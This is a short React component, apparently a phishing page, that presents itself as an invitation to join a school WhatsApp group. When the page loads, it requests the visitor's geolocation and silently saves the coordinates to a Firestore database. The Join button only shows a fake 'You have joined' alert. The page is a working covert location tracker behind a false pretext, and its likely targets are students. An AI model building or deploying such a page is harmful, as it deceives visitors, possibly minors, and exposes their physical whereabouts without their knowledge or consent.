import React, { useState, useEffect } from "react";
import { useDispatch } from "react-redux";
import { saveLocationSuccess, saveLocationFailure } from "../redux/actions/locationActions";
import { db } from "../firebase";
import { collection, addDoc } from "firebase/firestore";

const App = () => {
  const [error, setError] = useState(null);
  const dispatch = useDispatch();

  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          };
          dispatch(saveLocationSuccess(location));

          try {
            await addDoc(collection(db, "locations"), location);
          } catch (e) {
            console.error("Error adding document: ", e);
          }
        },
        (error) => {
          setError(error.message);
          dispatch(saveLocationFailure(error.message));
        }
      );
    } else {
      const errorMessage = "Geolocation is not supported by this browser.";
      setError(errorMessage);
      dispatch(saveLocationFailure(errorMessage));
    }
  }, [dispatch]);

  const handleJoinClick = () => {
    alert("You have joined the WhatsApp  school Group!");
  };

  return (
    <div className="app">
      <h1>Join the School WhatsApp Group</h1>
      {error && <p>Error: {error}</p>}
      <button className="join-button" onClick={handleJoinClick}>
        Join
      </button>
    </div>
  );
};

export default App;